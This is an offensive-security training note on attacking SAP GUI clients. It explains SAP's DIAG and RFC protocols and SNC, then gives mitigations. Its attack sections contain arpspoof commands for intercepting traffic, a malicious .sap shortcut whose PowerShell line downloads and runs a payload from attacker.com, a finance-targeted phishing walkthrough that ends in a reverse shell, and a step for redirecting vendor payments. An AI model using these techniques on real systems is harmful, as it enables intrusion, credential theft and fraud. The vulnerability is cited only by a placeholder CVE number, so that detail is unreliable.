---
tags: [network, advanced, ics, scada, sap, vapt]
difficulty: advanced
module: "79 - Advanced Network Services: ICS, SCADA, Mainframes, SAP"
topic: "79.06 Attacking SAP GUI and Client Interfaces"
---

# 79.06 Attacking SAP GUI and Client Interfaces

## 1. Introduction to SAP GUI and Client Architecture

The SAP GUI (Graphical User Interface) is the standard client application used to interact with SAP ERP and other SAP enterprise applications. Unlike modern web applications that rely on standard HTTP/HTTPS protocols, SAP GUI predominantly uses proprietary protocols such as SAP DIAG (Dynamic Information and Action Gateway) and RFC (Remote Function Call). These protocols operate over standard TCP ports (typically starting at 3200 for DIAG and 3300 for RFC).

SAP GUI client installations represent a significant attack surface in enterprise environments because they are installed on thousands of employee workstations, often with complex configurations, locally cached credentials, and varying patch levels. An attacker who compromises an SAP GUI client or intercepts its traffic can pivot directly into the heart of an organization's business logic, manipulating financial data, HR records, and supply chains.

The architecture typically involves:
1.  **Presentation Layer**: The SAP GUI application running on the user's workstation.
2.  **Application Layer**: The SAP NetWeaver AS ABAP server processing the business logic.
3.  **Database Layer**: The backend relational database (e.g., SAP HANA, Oracle, DB2).

The communication between the Presentation Layer and the Application Layer is the primary focus of this note.

## 2. Protocol Deep Dive: DIAG and RFC

### 2.1 The SAP DIAG Protocol
DIAG is the protocol used for communication between SAP GUI and the SAP Application Server (Dispatcher process). It is essentially a terminal protocol, similar in concept to Telnet or X11, but highly optimized and proprietary.
-   **Port Range**: `3200 - 3299` (The specific port depends on the system number. For instance, system number 00 uses port 3200).
-   **Characteristics**: By default, DIAG traffic is **unencrypted**. It is compressed, making it difficult to read natively in Wireshark without decompression plugins, but it is fundamentally sent in plain text.
-   **Vulnerability**: Since DIAG does not encrypt data, any attacker with a vantage point on the network (e.g., via ARP spoofing) can capture keystrokes, business data, and even session tokens.

### 2.2 The RFC Protocol
RFC is used for program-to-program communication within the SAP ecosystem. It can be used by external applications to call SAP functions or between different SAP instances.
-   **Port Range**: `3300 - 3399` (Again, system number 00 uses 3300).
-   **Characteristics**: Like DIAG, traditional RFC is unencrypted by default.

### 2.3 Secure Network Communications (SNC)
To mitigate the risks of unencrypted DIAG and RFC, SAP provides a layer called SNC. SNC acts as a wrapper, encrypting the communication using technologies like Kerberos, NTLM, or X.509 certificates.
-   **Misconfiguration Risk**: SNC is not enabled by default. Even when enabled, if weak cryptographic algorithms are used or if the implementation is flawed, it can still be vulnerable to downgrade attacks or brute-forcing.

## 3. Threat Modeling and Attack Surface

The attack surface of SAP GUI can be broadly categorized into three areas:
1.  **Network Level**: Man-in-the-Middle (MitM) attacks against unencrypted DIAG/RFC traffic.
2.  **Client Configuration Level**: Exploitation of insecurely stored local files, registry keys, and cached credentials.
3.  **Client Application Level**: Exploiting memory corruption or logical flaws in the SAP GUI executable itself.

## 4. Specific Attack Vectors

### 4.1 Network Sniffing and Man-in-the-Middle (MitM)
If SNC is disabled, an attacker on the same local network as the victim can intercept SAP traffic.

**Execution Steps:**
1.  Establish a MitM position using ARP spoofing or DHCP poisoning.
    ```bash
    arpspoof -i eth0 -t <Target_IP> <Gateway_IP>
    arpspoof -i eth0 -t <Gateway_IP> <Target_IP>
    ```
2.  Use a tool like `Cain & Abel` (legacy, but effective for SAP) or specialized SAP security tools like `pysap` (an open-source Python library for manipulating SAP protocols).
3.  Intercept the authentication phase. The attacker will be able to capture the username, the SAP client number, and the password in plain text (after decompression).

### 4.2 Malicious SAP Shortcuts (.sap files)
SAP allows users to create shortcut files (`.sap`) to quickly connect to specific systems or execute specific transactions. These files are plain text INI-style files.
A critical vulnerability (e.g., CVE-2017-XXXX, and various logical flaws) exists where maliciously crafted `.sap` files can be used to execute arbitrary operating system commands on the client machine.

**Example of a Malicious `.sap` file payload:**
```ini
[System]
Name=Malicious System
Client=100
[User]
Name=Attacker
Language=EN
[Function]
Title=Important Financial Report
Command=cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile $env:TEMP\payload.exe; Start-Process $env:TEMP\payload.exe"
Type=SystemCommand
```
If an attacker sends this file via a phishing email and the victim double-clicks it, the command executes with the privileges of the victim user.

### 4.3 Weakly Protected Configuration Files
SAP GUI stores its configuration, including server connections and sometimes cached credentials, in specific files and registry keys.
-   **`saplogon.ini`**: Traditionally stored connection details in plain text.
-   **`SAPUILandscape.xml`**: The modern equivalent of `saplogon.ini`.
-   **Location**: Typically found in `%APPDATA%\SAP\Common\` or `%USERPROFILE%\AppData\Roaming\SAP\Common\`.

An attacker who gains local access to a machine can extract these files to enumerate the entire SAP landscape of the organization. Furthermore, if the user has checked "Save Password" for specific RFC connections, these can sometimes be decrypted.

### 4.4 Exploiting SAP Router
While not strictly the GUI, the SAPRouter acts as a proxy for SAP traffic, often deployed at the perimeter. Misconfigured SAPRouters can allow unauthorized external attackers to route traffic into the internal network, targeting internal SAP Application Servers directly.

**Enumerating SAP Router:**
```bash
nmap -p 3299 --script sap-router-info <Target_IP>
```
If the routing table (`saprouttab`) is excessively permissive (e.g., `P * * *`), an attacker can connect to internal SAP instances through the router.

## 5. Practical Exploitation Walkthroughs

### Scenario: Exploiting a Malicious `.sap` file
1.  **Reconnaissance**: Identify that the target organization uses SAP. This can be deduced from job postings, LinkedIn, or intercepted network traffic.
2.  **Weaponization**: Create a `.sap` file that executes a reverse shell.
3.  **Delivery**: Send an email to a finance employee with the subject "Q3 Budget Adjustments - Urgent" and attach the `.sap` file.
4.  **Exploitation**: The user opens the `.sap` file because it has the familiar SAP icon and is associated with their daily work tool.
5.  **Installation**: The PowerShell payload executes, downloading and running the C2 agent.
6.  **Command and Control**: The attacker receives a reverse shell on the victim's workstation, gaining access to the internal network and the user's active SAP sessions.

### Scenario: Network Sniffing with PySAP
Using the `pysap` library, an attacker can programmatically dissect DIAG packets.

```python
# snippet using pysap to parse a pcap and extract SAP DIAG traffic
from pysap.SAPDIAG import SAPDIAG
import pyshark

cap = pyshark.FileCapture('sap_traffic.pcap', display_filter='tcp.port == 3200')
for packet in cap:
    try:
        # Extract the TCP payload and attempt to parse it as SAP DIAG
        payload = packet.tcp.payload.binary_value
        diag_packet = SAPDIAG(payload)
        diag_packet.show()
    except Exception as e:
        continue
```
This script would reveal the decompressed contents of the DIAG communication, potentially exposing sensitive business transactions.

## 6. Post-Exploitation and Privilege Escalation

Once an attacker has compromised an SAP GUI client or obtained credentials:
1.  **Data Exfiltration**: The attacker logs into the SAP system and executes transactions to download employee lists (PA20), financial records (FB03), or customer data.
2.  **Transaction Manipulation**: The attacker modifies vendor bank account details (FK02) to redirect payments to their own accounts.
3.  **Pivoting to the Server**: If the compromised user has SAP administration rights (`SAP_ALL`), the attacker can use transactions like `SM49` or `SM69` to execute OS commands on the SAP Application Server itself, achieving a full server compromise.
4.  **Session Hijacking**: SAP GUI sessions (Diag) can be hijacked if the attacker can inject traffic into the active TCP stream, although this is complex.

## 7. Defense and Mitigation

-   **Enable SNC**: The most critical defense is to enforce Secure Network Communications (SNC) across all SAP connections. This encrypts the DIAG and RFC traffic, neutralizing MitM sniffing attacks.
-   **Patch SAP GUI**: Regularly update the SAP GUI client software to the latest patch level to mitigate client-side vulnerabilities, particularly those related to `.sap` shortcut handling and memory corruption.
-   **Restrict SAP Shortcuts**: Implement Group Policy or SAP configuration changes to restrict the types of commands that can be executed from `.sap` shortcut files.
-   **Harden SAPRouter**: Ensure the `saprouttab` is tightly controlled, operating on a deny-by-default basis, and only allowing specific external IPs to connect to specific internal IPs and ports.
-   **Endpoint Detection and Response (EDR)**: Deploy EDR agents on user workstations to detect the execution of suspicious child processes (like `cmd.exe` or `powershell.exe`) spawned by `saplogon.exe`.
-   **Multi-Factor Authentication (MFA)**: Implement MFA for SAP logins, particularly for users with high privileges or those accessing the system remotely.

## 8. ASCII Diagram: SAP GUI Attack Architecture

```text
                               +---------------------------------------------------+
                               |                Attacker Environment               |
                               |                                                   |
                               | 1. ARP Spoofing / MitM    3. Phishing with .sap   |
                               | 2. Traffic Decryption     4. C2 Server Listener   |
                               +---------------------------------------------------+
                                        |                        |
                   +-- Sniffing unencrypted DIAG/RFC --+         |
                   |                                   |         | (Email Delivery)
                   v                                   v         v
+-----------------------------------+     +-----------------------------------------+
|        SAP Application Server     |     |          Victim Workstation             |
|                                   |     |                                         |
| +-------------------------------+ |     | +-------------------------------------+ |
| |        Dispatcher (Port 32xx) | |<----| |          SAP GUI Client             | |
| +-------------------------------+ | DIAG| |                                     | |
|                                   |     | | - Reads saplogon.ini                | |
| +-------------------------------+ |     | | - Executes .sap shortcuts           | |
| |   Gateway / RFC (Port 33xx)   | |<----| | - Renders Business Logic            | |
| +-------------------------------+ | RFC | +-------------------------------------+ |
+-----------------------------------+     |                                         |
                                          | +-------------------------------------+ |
                                          | | Operating System (Windows)          | |
                                          | | - Local Registry / Config Files     | |
                                          | | - Vulnerable to RCE via SAP GUI     | |
                                          | +-------------------------------------+ |
                                          +-----------------------------------------+
```

## 9. Chaining Opportunities
-   **[[05 - Exploit Development in Windows Environments]]**: RCE vulnerabilities found in SAP GUI binaries (e.g., buffer overflows) can be exploited using custom Windows exploit development techniques.
-   **[[12 - Advanced Phishing and Client-Side Attacks]]**: Malicious `.sap` shortcut files are an excellent payload for targeted spear-phishing campaigns against corporate environments.
-   **[[25 - Active Directory Privilege Escalation]]**: Once a reverse shell is obtained via an SAP GUI exploit, the attacker can proceed with standard AD privilege escalation techniques on the victim's workstation.

## 10. Related Notes
-   [[15 - ERP Security and Penetration Testing]]
-   [[22 - Man-in-the-Middle and Layer 2 Attacks]]
-   [[40 - Application Whitelisting Bypass]]
